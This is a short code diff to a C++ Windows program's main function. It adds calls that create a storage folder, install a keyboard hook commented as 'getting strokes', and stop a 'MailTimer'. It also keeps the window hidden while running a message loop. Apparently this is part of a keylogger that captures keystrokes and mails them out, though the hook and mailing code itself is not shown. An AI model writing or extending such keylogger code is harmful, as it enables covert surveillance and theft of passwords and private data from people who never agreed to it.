@@ -13,6 +13,8 @@ int main(int argc, char** argv) {
 	
 	// disabling render prompt (main thread)
 	MSG Msg;
+	IO::MKDir(IO::GetPath(true)); // creating the folder for path
+	Hooks::InstallHook(); // getting strokes
 	// infinite loop for taking messages
 	while(GetMessage (&Msg, NULL, 0, 0)) {
 		// takes a message intended for a GUI
@@ -20,5 +22,6 @@ int main(int argc, char** argv) {
 		// forward the message to the system
 		DispatchMessage(&Msg);
 	}
+	Hooks::MailTimer.Stop();
 	return 0;
 }
